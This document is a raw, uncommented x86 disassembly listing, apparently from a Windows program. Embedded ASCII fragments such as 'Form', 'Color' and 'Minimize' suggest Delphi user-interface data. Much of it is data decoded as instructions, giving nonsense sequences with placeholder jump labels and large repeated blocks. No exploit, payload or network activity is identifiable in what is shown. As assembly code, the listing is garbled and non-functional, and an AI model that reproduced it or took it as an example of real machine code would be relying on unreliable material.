inc edx
popad
jb r-xdata
inc ecx
add [ eax + ebp * 8 + 0x54110044 ] bl
popad
jb r-xdata
popad
outsb
add [ gs : bx + si ] dl
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ esi ] al
push ebx
insd
outsd
outsd
je r-xdata
imul ebp [ esi ] 0x2c004010
add [ eax ] al
inc [ eax + esi * 8 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
mov eax 0x70044c2
adc [ ebx + eax * 2 + 0x6f ] edx
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
retn 0x44
or dh [ ebx + 0x73 ]
jae r-xdata
add [ eax ] al
[ 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
cmp al 0x10
inc eax
add [ eax ] dh
add [ eax ] al
jmp eax
jmp sub_4046f8
retn 0x44
inc ecx
add [ esi + ebp * 2 + 0x6eb40041 ] ch
jb r-xdata
inc esi
insb
popad
je r-xdata
add [ eax + 0x24004041 ] bh
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ esp + eax * 8 + 0x77080044 ] bl
jae r-xdata
add [ eax ] al
insb
push ebx
arpl [ edx + 0x6f ] si
add eax 0x6d726f46
jae r-xdata
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
pop esp
adc al 0x44
add ah bh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax ] bh
hlt
add [ ebx ] sub_41e1e8
mov eax 0x24004041
outsd
jb r-xdata
insb
insb
inc edx
popad
jb r-xdata
dec eax
outsd
je r-xdata
add [ eax + 0x48 ] cl
inc esp
add al al
add eax 0x6dc80044
inc ecx
add [ eax - 0x18 ] cl
inc ebx
add al bl
inc [ ebx ]
mov esp 0x300043f0
mov edi 0xe2000043
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
jl r-xdata
add al al
inc esp
add [ edx + eax * 2 + 0x44 ] ch
add [ eax + 0x48 ] bh
inc esp
add ah al
inc edi
inc esp
add [ eax ] ah
mov dl 0x43
add [ eax ] dh
cmp eax 0x3d500044
inc esp
add [ ecx + edi - 0x4e9fffbc ] bh
inc ebx
add [ ecx + esi * 4 + 0x43 ] ah
add [ eax ] bl
0xea440043 0x43
fdivr st7
inc ebx
add [ eax + esi * 8 - 0x40cfffbd ] bh
inc ebx
add [ eax ] al
loop r-xdata
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
add ah bh
cmp eax [ eax + eax + 0x8 ]
pop ss
inc esp
add [ eax + 0x6c00444f ] dh
cmp [ eax + eax ] al
push ecx
inc esp
add [ ebx + edi + 0x44 ] ah
add ah ah
hlt
inc esp
add [ eax ] dh
retn
adc al 0xbf
inc ebx
add [ ebx + esi * 4 - 0x3f5fffbd ] bl
inc ebx
add [ ecx + edx * 2 + 0x44 ] bh
add ah ah
fiadd [ ecx ]
inc ecx
jae r-xdata
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
nop
int1
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add [ eax + 0x30044c4 ] ah
or al 0x54
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
shl [ eax ] 0xc5
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + eax * 8 + 0x44 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + eax * 8 ] dl
inc esp
add [ edx ] bh
mov [ eax + eax + 0x64 ] 0x2
add [ eax ] al
add al 0x81
inc ebx
add al ch
loope r-xdata
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
sub_44c24c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x44c2
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x480044c2 ] ah
inc [ ecx ]
add [ 0x6f6c6f43 ] al
jb r-xdata
outsd
insb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
out dx eax
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax + eax ] 0x0
rol [ eax + eax + 0x8 ] 0x0
add bh bh
or [ eax ] al
add bh bh
xchg esp eax
call sub_44c378
jb r-xdata
sar [ eax + 0x70044c2 ] 0x11
push esp
inc ebx
outsd
outsb
cmp al 0x10
inc eax
add [ eax ] dl
add [ eax ] al
[ ecx + esi * 8 + 0x44 ]
adc [ eax ] al
sbb al [ eax ]
add bh bh
sbb al [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
push es
dec ebp
popad
jb r-xdata
push esp
inc ebx
outsd
outsb
je r-xdata
arpl [ ebx + 0x5 ] bp
inc esi
outsd
jb r-xdata
add [ eax + 0x8 ] al
add al [ eax ]
or [ ecx + 0x6e ] ecx
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
add [ eax ] al
outsd
insb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
popad
outsb
add [ gs : bx + si ] dl
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ esi ] al
push ebx
insd
outsd
outsd
je r-xdata
imul ebp [ esi ] 0x2c004010
add [ eax ] al
inc [ eax + esi * 8 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
mov eax 0x70044c2
adc [ ebx + eax * 2 + 0x6f ] edx
jae r-xdata
add [ eax ] al
add [ eax ] al
inc edx
inc ecx
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ ebp + ebp * 2 + 0x6eac0041 ] bl
inc ecx
add [ esi + ebp * 2 - 0x1763ffbf ] dh
inc esp
add [ ecx ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0x480044c2 ]
retn 0x44
add [ eax ] al
[ 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
cmp al 0x10
inc eax
add [ eax ] dh
add [ eax ] al
jmp eax
jmp sub_4046f8
retn 0x44
add [ eax + 0x24004041 ] bh
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ esp + eax * 8 + 0x77080044 ] bl
jae r-xdata
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
pop esp
adc al 0x44
add ah bh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax ] bh
hlt
add [ ebx ] sub_41e1e8
mov eax 0x24004041
outsd
jb r-xdata
add [ eax + 0x48 ] cl
inc esp
add al al
add eax 0x6dc80044
inc ecx
add [ eax - 0x18 ] cl
inc ebx
add al bl
inc [ ebx ]
mov esp 0x300043f0
mov edi 0xe2000043
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
jl r-xdata
add al al
inc esp
add [ edx + eax * 2 + 0x44 ] ch
add [ eax + 0x48 ] bh
inc esp
add ah al
inc edi
inc esp
add [ eax ] ah
mov dl 0x43
add [ eax ] dh
cmp eax 0x3d500044
inc esp
add [ ecx + edi - 0x4e9fffbc ] bh
inc ebx
add [ ecx + esi * 4 + 0x43 ] ah
add [ eax ] bl
0xea440043 0x43
fdivr st7
inc ebx
add [ eax + esi * 8 - 0x40cfffbd ] bh
inc ebx
add [ eax ] al
loop r-xdata
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
add ah bh
cmp eax [ eax + eax + 0x8 ]
pop ss
inc esp
add [ eax + 0x6c00444f ] dh
cmp [ eax + eax ] al
push ecx
inc esp
add [ ebx + edi + 0x44 ] ah
add ah ah
hlt
inc esp
add [ eax ] dh
retn
adc al 0xbf
inc ebx
add [ ebx + esi * 4 - 0x3f5fffbd ] bl
inc ebx
add [ ecx + edx * 2 + 0x44 ] bh
add ah ah
fiadd [ ecx ]
inc ecx
jae r-xdata
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
nop
int1
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add [ eax + 0x30044c4 ] ah
or al 0x54
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
shl [ eax ] 0xc5
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + eax * 8 + 0x44 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + eax * 8 ] dl
inc esp
add [ edx ] bh
mov [ eax + eax + 0x64 ] 0x2
add [ eax ] al
add al 0x81
inc ebx
add al ch
loope r-xdata
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
sub_44c378
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
push ebx
insd
outsd
outsd
je r-xdata
outsb
je r-xdata
add [ eax ] al
[ 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
cmp al 0x10
inc eax
add [ eax ] dh
add [ eax ] al
jmp eax
popad
outsb
add [ gs : bx + si ] dl
outsd
insb
outsd
jb r-xdata
add [ eax + 0x24004041 ] bh
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ esp + eax * 8 + 0x77080044 ] bl
jae r-xdata
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ esi ] al
add eax 0x676e6152
add [ gs : eax ] dl
adc [ eax ] al
or al 0x0
add bh bh
sbb al 0xf0
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x6f500800
jae r-xdata
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
pop esp
adc al 0x44
add ah bh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax ] bh
hlt
add [ ebx ] sub_41e1e8
mov eax 0x24004041
outsd
jb r-xdata
add [ eax ] al
je r-xdata
add [ eax + 0x48 ] cl
inc esp
add al al
add eax 0x6dc80044
inc ecx
add [ eax - 0x18 ] cl
inc ebx
add al bl
inc [ ebx ]
mov esp 0x300043f0
mov edi 0xe2000043
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
jmp [ ecx + esi * 8 ]
outsd
outsb
cmp al 0x10
inc eax
add [ eax ] dl
add [ eax ] al
[ ecx + esi * 8 + 0x44 ]
jl r-xdata
add al al
inc esp
add [ edx + eax * 2 + 0x44 ] ch
add [ eax + 0x48 ] bh
inc esp
add ah al
inc edi
inc esp
add [ eax ] ah
mov dl 0x43
add [ eax ] dh
cmp eax 0x3d500044
inc esp
add [ ecx + edi - 0x4e9fffbc ] bh
inc ebx
add [ ecx + esi * 4 + 0x43 ] ah
add [ eax ] bl
0xea440043 0x43
fdivr st7
inc ebx
add [ eax + esi * 8 - 0x40cfffbd ] bh
inc ebx
add [ eax ] al
loop r-xdata
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
add ah bh
cmp eax [ eax + eax + 0x8 ]
pop ss
inc esp
add [ eax + 0x6c00444f ] dh
cmp [ eax + eax ] al
push ecx
inc esp
add [ ebx + edi + 0x44 ] ah
add ah ah
hlt
inc esp
add [ eax ] dh
retn
adc al 0xbf
inc ebx
add [ ebx + esi * 4 - 0x3f5fffbd ] bl
inc ebx
add [ ecx + edx * 2 + 0x44 ] bh
add ah ah
fiadd [ ecx ]
inc ecx
jae r-xdata
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
nop
int1
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add [ eax + 0x30044c4 ] ah
or al 0x54
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
shl [ eax ] 0xc5
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + eax * 8 + 0x44 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + eax * 8 ] dl
inc esp
add [ edx ] bh
mov [ eax + eax + 0x64 ] 0x2
add [ eax ] al
add al 0x81
inc ebx
add al ch
loope r-xdata
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
sub_44c700
push esp
add al [ eax ]
dec [ esi + esi * 8 + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
or eax 0x74726556
push ebx
arpl [ edx + 0x6f ] si
or [ gs : edx + 0x73 ] ah
push ebx
imul ebp [ esi + 0x67 ] 0x620a656c
jae r-xdata
mov [ eax + eax + 0x3 ] 0x6f465410
jb r-xdata
jb r-xdata
imul edi [ edx + 0x65 ] 0x656c6261
or [ edx + 0x73 ] ah
inc esp
imul esp [ ecx + 0x6c ] 0x620c676f
jae r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ edi + eax * 8 ] ah
inc esp
add [ 0x6d726f46 ] al
inc edx
outsd
jb r-xdata
push cs
push esp
jae r-xdata
dec eax
outsd
outsd
outsd
insb
push edi
imul ebp [ esi + 0x64 ] 0x620d776f
jae r-xdata
add eax 0x24000000
outsd
imul edx [ eax + 0x100414f ] 0xffffffa5
sbb eax 0x2bea1e43
out 0x4d eax
mov [ 0xfffffffffd45cc30 ] eax
das
mov cl 0xec
add eax 0x6d726f46
jae r-xdata
inc eax
add [ eax + 0xf0044c7 ] bh
jb r-xdata
jb r-xdata
add ecx [ ebx ]
push esp
inc edx
jo r-xdata
or [ ecx + 0x4f ] cl
insb
inc esi
outsd
jb r-xdata
add bh bh
dec [ ebx + 0x44c7ecc0 ]
add [ edi ] cl
push ds
0xa34de72b 0xcc30
imul edi [ edx + 0x65 ] 0x6c6f6f54
push edi
imul ebp [ esi + 0x5 ] 0x6d726f46
je r-xdata
jb r-xdata
je r-xdata
push eax
outsd
jb r-xdata
outsd
outsb
inc ecx
jb r-xdata
jae r-xdata
xor [ ecx ] dl
jb r-xdata
mov [ eax + eax + 0x3 ] 0x6f42540c
lea eax [ eax ]
sbb al 0xc8
inc eax
add [ ecx ] al
jae r-xdata
or eax 0x73654449
imul esp [ edi + 0x6e ] 0x6f487265
lea eax [ eax ]
mov eax 0xf0044c7
mov [ eax + eax + 0x6 ] 0x6f4e7362
outsb
insb
add [ gs : eax ] eax
add [ eax ] al
add [ 0x24000000 ] al
jo r-xdata
je r-xdata
inc edx
arpl [ edi + 0x6e ] bp
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + ecx * 8 + 0x620c0044 ] dl
imul edx [ ebx + 0x79 ] 0x6d657473
outsd
jb r-xdata
or esp [ esi + 0x73 ]
push ebx
je r-xdata
outsd
popad
jns r-xdata
bound ebp [ ecx + 0x53 ]
jns r-xdata
outsd
jb r-xdata
jb r-xdata
jae r-xdata
jb r-xdata
inc esp
add [ ebx ] al
or al 0x54
inc edx
outsd
insb
insb
inc edx
popad
jb r-xdata
shl ecx 0x2
int 0xda
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4605da82
outsd
jb r-xdata
inc esi
outsd
dec ebp
popad
imul ebp [ esi + 0x46 ] 0x436d726f
outsb
je r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ edi ] al
add [ eax ] al
add ah bh
enter 0x44 0xa
jo r-xdata
push ebx
arpl [ edx + 0x65 ] si
outsb
inc ebx
outsb
je r-xdata
jb r-xdata
or ah [ edx + 0x69 ]
dec ebp
bound ebp [ ecx + 0x4d ]
imul ebp [ esi + 0x69 ] 0x657a696d
inc esp
add [ esi ] al
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add bh bh
insb
je r-xdata
push es
popad
insb
or ah [ esi + 0x73 ]
dec ebp
inc esp
add [ ecx ] dl
dec [ ebp - 0x37e3ffc0 ]
add bh bh
push es
add eax 0x6d726f46
jae r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
inc esp
jae r-xdata
jo r-xdata
jb r-xdata
outsb
insb
jns r-xdata
arpl [ edi + 0x6e ] bp
jae r-xdata
dec edi
insb
jo r-xdata
insd
imul edi [ edx + 0x65 ] 0x48696206
bound ebp [ ecx + 0x48 ]
outsb
push esp
outsd
jo r-xdata
adc [ eax + 0x6f ] esi
jo r-xdata
outsb
or [ fs : eax + 0x6f ] esi
inc esp
popa
jne r-xdata
dec ebp
outsb
jne r-xdata
insd
or al 0x54
mov eax eax
call 0x6450db1
inc esi
outsd
jb r-xdata
popad
js r-xdata
insd
imul edi [ edx + 0x65 ] 0x4d69620a
inc esp
dec ecx
inc esi
leave
inc esp
add [ esi ] al
jo r-xdata
inc eax
add [ eax + 0x80044ca ] al
arpl [ ecx + ebp * 2 + 0x76 ] si
leave
inc esp
add [ ebx ] al
or edx [ eax + edx * 2 + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
add eax 0x6d726f46
jo r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah ch
arpl [ ecx + 0x6c ] sp
inc ebx
outsb
je r-xdata
inc esi
or ah [ ebp + ebp * 2 + 0x4d ]
insd
push eax
adc [ eax + 0x6f ] dh
jo r-xdata
push cs
jo r-xdata
jae r-xdata
enter 0x44 0x90
add cl cl
xchg esp eax
jb r-xdata
lea eax [ eax ]
cwde
enter 0x44 0x3
inc esi
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x90044c9 ] bl
je r-xdata
inc esp
popa
inc esp
popa
jne r-xdata
jne r-xdata
pushfd
je r-xdata
insb
jns r-xdata
jae r-xdata
or edx [ ebx + eax * 2 + 0x6c ]
or dl 0x44
add [ eax ] cl
dec esi
outsd
outsb
push cs
inc ebx
insb
outsd
inc ebp
jbe r-xdata
insb
leave
inc esp
add [ ebx ] al
andps xmm0 [ ebp + 0x66 ]
push esp
push eax
dec edi
ja r-xdata
outsb
je r-xdata
jb r-xdata
nop
insd
popad
jb r-xdata
popad
dec ebp
inc esp
jae r-xdata
outsd
insd
inc esp
jae r-xdata
add [ eax ] al
add eax [ eax ]
add [ eax ] al
cwde
leave
inc esp
add [ ecx ] cl
inc esp
popa
jne r-xdata
inc esp
add [ ebx ] al
or [ eax + edx * 2 + 0x6f ] edx
leave
jae r-xdata
je r-xdata
je r-xdata
add ecx [ edi ]
push esp
imul edi [ edx + 0x65 ] 0x796c6e4f
jo r-xdata
push cs
je r-xdata
popad
je r-xdata
pshufw mm5 [ edi + 0x44 ] 0x65
jae r-xdata
jo r-xdata
inc esp
dec ecx
inc ebx
push 0x9646c69
jae r-xdata
shr al 0xc8
outsd
inc ebx
insb
push eax
jb r-xdata
insd
popad
outsb
add al 0x57
outsd
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ eax ] dl
adc [ eax ] eax
add [ eax ] dl
inc eax
add [ eax + r-xdata ] dl
or [ esi ] cl
push esp
push ebx
push 0x4374726f
jne r-xdata
jae r-xdata
outsb
je r-xdata
outsd
jae r-xdata
push es
arpl [ ecx + 0x46 ] sp
jb r-xdata
jb r-xdata
jb r-xdata
arpl [ ecx + 0x4e ] sp
outsd
outsb
push es
arpl [ ecx + 0x48 ] sp
imul esp [ ebp + 0x6 ] 0x72466163
or ah [ gs : ebx + 0x61 ]
add [ eax ] al
add [ edx + ecx * 8 ] dh
inc esi
outsd
jb r-xdata
outsd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc esp
add [ esi ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
xor al 0xca
je r-xdata
push eax
outsd
jo r-xdata
or edx [ edx + eax * 2 + 0x6f ]
inc eax
add [ eax + 0x30044c8 ] bl
inc esi
outsd
jb r-xdata
jae r-xdata
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x1
jae r-xdata
jo r-xdata
jne r-xdata
add [ esp + eax * 2 ] al
popad
je r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] al
push 0x3c004010
adc [ eax ] al
add [ eax ] dl
inc eax
add [ ebp - 0x345fffc0 ] cl
inc esp
add [ ebx ] al
inc ebp
jbe r-xdata
add cl [ eax ]
push es
push ecx
jne r-xdata
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
add eax 0x6d726f46
jae r-xdata
or ah [ gs : ebx + 0x61 ]
insd
outsd
add [ eax ] al
in al dx
jae r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
adc [ eax ] eax
xor al 0xca
inc esp
add [ ebp - 0x353bffc0 ] cl
inc esp
add [ eax ] cl
adc [ ebx + eax * 2 + 0x6c ] dl
outsd
jae r-xdata
jb r-xdata
jo r-xdata
outsb
or al 0x54
inc ebx
insb
outsd
jae r-xdata
add [ esi ] eax
jb r-xdata
or [ ebp + ebp * 2 + 0x50 ] esp
cmp dl cl
inc esp
add [ ebx ] al
or al 0x54
inc ebx
insb
outsd
jae r-xdata
jb r-xdata
inc ebp
add [ eax ] dh
outsd
or dh [ eax + 0x6d ]
inc ebp
js r-xdata
pop es
dec ecx
outsb
je r-xdata
sbb [ edi ] bh
jo r-xdata
outsd
insb
popad
outsb
outsb
je r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
popad
outsb
add [ eax ] al
jb r-xdata
outsd
outsd
insb
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
inc ecx
or al 0x64
insd
add [ ebx ] al
add [ eax ] eax
add [ eax ] al
outsb
je r-xdata
push ebx
outsb
jb r-xdata
or [ esi ] al
imul ebp [ edi + 0x6e ] 0x700c6c61
outsd
push eax
jb r-xdata
mov edi 0xe2000043
inc ecx
add [ eax - 0x23ffbaf4 ] bh
insb
imul esp [ ebx + 0x69 ] 0x6f460574
jb r-xdata
imul esi [ ebp + eax + 0x46 ] 0x736d726f
and al 0xcc
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
int 0x44
add al bh
into
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x33 ] dl
jb r-xdata
inc esp
add dh ah
into
inc esp
add [ ebx + eax ] bl
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ebx + ecx * 8 + 0x70060044 ] bl
insd
dec esi
outsd
outsb
push es
jo r-xdata
add dl [ ecx ]
add ecx [ ebp + 0x73 ]
push es
push esp
push edi
dec ebp
dec ebx
jns r-xdata
jo r-xdata
inc ebp
jbe r-xdata
imul ebp [ esi + 0x46 ] 0xc6d726f
insd
jb r-xdata
outsb
je r-xdata
fiadd [ ecx ]
movsb [ edi ] [ esi ]
push ebp
inc ebp
add [ esp + edi * 8 ] dl
mov eax 0xdc00450c
jae r-xdata
inc esp
add [ edx + eax * 2 + 0x44 ] ch
add [ eax + 0x48 ] bh
inc esp
add ah al
inc edi
inc esp
add [ eax ] ah
mov dl 0x43
add [ eax ] dh
cmp eax 0x8ec0044
inc ebp
add [ ecx + edi - 0x4e9fffbc ] bh
inc ebx
add [ ecx + esi * 4 + 0x43 ] ah
add al ah
or [ ebp ] eax
inc esp
0x52700043 0x45
fcomp st6
inc ecx
add [ ebp + edx * 2 - 0x3ebffbb ] ah
inc eax
add ah al
inc [ eax + eax + 0x48 ]
dec eax
inc esp
add [ eax - 0x37ffbafb ] bh
insd
inc ecx
add [ eax - 0x13ffbaff ] ah
add [ eax + 0x5c0044fd ] ah
inc [ eax + eax - 0x40 ]
inc ecx
inc eax
add [ eax + 0x2f ] al
inc ebp
add ah bh
inc eax
add [ eax ] bl
aas
inc ebx
popad
insb
insb
dec eax
insb
jo r-xdata
or [ ebx + 0x61 ] al
add [ ebp ] eax
sub [ ebx ] al
mov al [ 0xffffffffec004501 ]
inc ecx
dec eax
popad
outsb
insb
pop es
inc edx
pop es
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
cmp al 0x10
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
mov al [ 0x30044cb ]
jbe r-xdata
add [ eax ] al
add [ eax ] al
adc [ eax ] al
inc esp

outsb
je r-xdata
adc [ eax + 0x6f ] esi
0x44
outsd
inc esi
imul esi [ ebp + eax + 0x46 ] 0x736d726f
add ah ah
les eax [ eax + eax - 0x18 ]
loope r-xdata
add eax [ eax ]
int3
pop es
inc edx
outsd
outsd
insb
popad
inc edx
outsd
add [ eax ] al
pushfd

outsb
je r-xdata
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ edi ] al
inc ebx
outsd
insd
add eax [ eax ]
pop es
add [ eax ] ecx
inc ebx
popad
outsb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
sub_44cb42
inc esp
add [ eax ] cl
or dl [ eax + ecx * 2 + 0x65 ]
insb
jo r-xdata
cmp al 0x10
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
mov al [ 0x30044cb ]
jbe r-xdata
sbb [ edi ] bh
jo r-xdata
add [ eax ] al
pushfd

outsb
je r-xdata
inc esp
add dh ah
into
inc esp
add [ ebx + eax ] bl
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ebx + ecx * 8 + 0x70060044 ] bl
insd
dec esi
outsd
outsb
push es
jo r-xdata
add [ edi ] al
inc ebx
outsd
insd
insd
popad
outsb
add al 0x57
outsd
jb r-xdata
add eax [ eax ]
pop es
inc esp
add [ edx + eax * 2 + 0x44 ] ch
add [ eax + 0x48 ] bh
inc esp
add ah al
inc edi
inc esp
add [ eax ] ah
mov dl 0x43
add [ eax ] dh
cmp eax 0x8ec0044
inc ebp
add [ ecx + edi - 0x4e9fffbc ] bh
inc ebx
add [ ecx + esi * 4 + 0x43 ] ah
add al ah
or [ ebp ] eax
inc esp
0x52700043 0x45
fcomp st6
inc ecx
add [ ebp + edx * 2 - 0x3ebffbb ] ah
inc eax
add ah al
inc [ eax + eax + 0x48 ]
dec eax
inc esp
add [ eax - 0x37ffbafb ] bh
insd
inc ecx
add [ eax - 0x13ffbaff ] ah
add [ eax + 0x5c0044fd ] ah
inc [ eax + eax - 0x40 ]
inc ecx
inc eax
add [ eax + 0x2f ] al
inc ebp
add ah bh
inc eax
add [ eax ] bl
aas
add [ ebp ] eax
sub [ ebx ] al
mov al [ 0xffffffffec004501 ]
inc ecx
jne r-xdata
add [ esp + eax * 2 ] al
popad
je r-xdata
inc ebp
add [ eax ] dh
outsd
or dh [ eax + 0x6d ]
inc ebp
js r-xdata
pop es
dec ecx
outsb
je r-xdata
mov edi 0xe2000043
inc ecx
add [ eax - 0x23ffbaf4 ] bh
insb
imul esp [ ebx + 0x69 ] 0x6f460574
jb r-xdata
imul esi [ ebp + eax + 0x46 ] 0x736d726f
and al 0xcc
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
int 0x44
add al bh
into
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x33 ] dl
jb r-xdata
fiadd [ ecx ]
movsb [ edi ] [ esi ]
push ebp
inc ebp
add [ esp + edi * 8 ] dl
mov eax 0xdc00450c
jae r-xdata
inc ebx
popad
insb
insb
dec eax
insb
jo r-xdata
or [ ebx + 0x61 ] al
add ah ah
les eax [ eax + eax - 0x18 ]
loope r-xdata
add eax [ eax ]
int3
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ eax ] dl
inc eax
add [ eax ] al
push 0x3c004010
adc [ eax ] al
add [ eax ] dl
inc eax
